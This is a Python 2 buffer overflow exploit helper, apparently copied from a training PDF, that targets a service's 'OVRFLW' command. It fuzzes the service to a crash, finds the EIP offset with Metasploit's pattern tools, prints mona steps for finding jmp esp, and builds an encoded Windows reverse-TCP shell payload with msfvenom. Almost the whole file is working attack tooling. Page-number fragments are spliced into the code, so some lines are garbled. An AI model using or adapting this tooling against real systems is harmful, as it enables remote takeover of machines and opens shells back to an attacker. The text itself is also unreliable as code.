#!/usr/bin/python
import socket
import os
host= raw_input("What is the host IP ")
port= int(raw_input("What is the host port "))
cmd = "OVRFLW"
def fuzzer():
# create an array of buffers, from 1 to 5900, with increments of 200.
print("Fuzzing program")
buffer=["A"]
counter=3000
while len(buffer) <= 60:
buffer.append("A"*counter)
counter=counter+100
for string in buffer:
try:
print "Fuzzing with %s bytes" % len(string)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((host,port))
s.send(cmd + string + '\r\n')
data = s.recv(1024)
except:
print("\n\nUse Pattern Offset Locator\n\n")
break
def PatterOffsetLocator():
# find the EIP location
try:
length = raw_input("What was the fuzzer length? ")
pattern = os.popen('/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l ' +
36 | Pagelength).read()
pattern.strip("\n")
print("The pattern in use is " + pattern)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((host,port))
s.send(cmd + pattern + '\r\n')
s.close()
print("Pattern sent, examine EIP!!")
eipaddr = raw_input("What is the EIP addr pattern? ")
offset = os.popen('/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l ' + length + ' -q ' +
eipaddr).read()
print("\n\nNext step confirm EIP\n\n")
print(offset)
except:
print("Break")
def confirm():
#Confirm EIP
try:
buffer = "A" * int(raw_input("Enter offset value "))
eip = "BBBB"
padding = "C" * (int(raw_input("Enter fuzzing value ")) - 4 - len(buffer))
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((host,port))
s.send(cmd + str(buffer) + str(eip) + str(padding) + '\r\n')
s.close()
print("EIP should be filled with B's with A's before and C's after\n\n")
print ("""
1. CHECK FOR BAD CHARS
2. USE !mona modules
A. CHECK FOR ASLR PROTECTIONS
B. CHECK FOR REBASE
3. CHECK FOR jmp esp instructions
A. USE !mona find -s jmp -r esp -m program.dll|exe
37 | PageB. USE !mona find -s "\\xff\\xe4" -m program.dll|exe
C. GET MEMORY LOCATION OF JMP ESP
""")
except:
print("break\n\n")
def payload():
try:
lhost = raw_input("What is your IP ")
lport = raw_input("What is your port ")
badchar = raw_input("What are the bad characters ")
selection = raw_input("Input the architecture (86 or 64) ")
if selection == "86":
arch = "-platform Windows -a x86 -p windows/shell_reverse_tcp"
if selection == "64":
arch = "-platform Windows -a x64 -p windows/x64/shell_reverse_tcp"
payday = os.popen('msfvenom ' + arch + ' LHOST=' + lhost + ' LPORT=' + lport + ' -f python -e
x86/shikata_ga_nai -b ' + badchar + ' -o payday').read()
print(payday)
except:
print("failed")
menu=True
while menu:
print ("""
1. Fuzz program to crash
2. Find location of EIP
3. Confirm EIP
4. Generate payload
""")
menuchoice=raw_input("Choose an option# ")
if menuchoice=="1":
fuzzer()
if menuchoice=="2":
PatterOffsetLocator()
38 | Pageif menuchoice=="3":
confirm()
if menuchoice=="4":
payload()
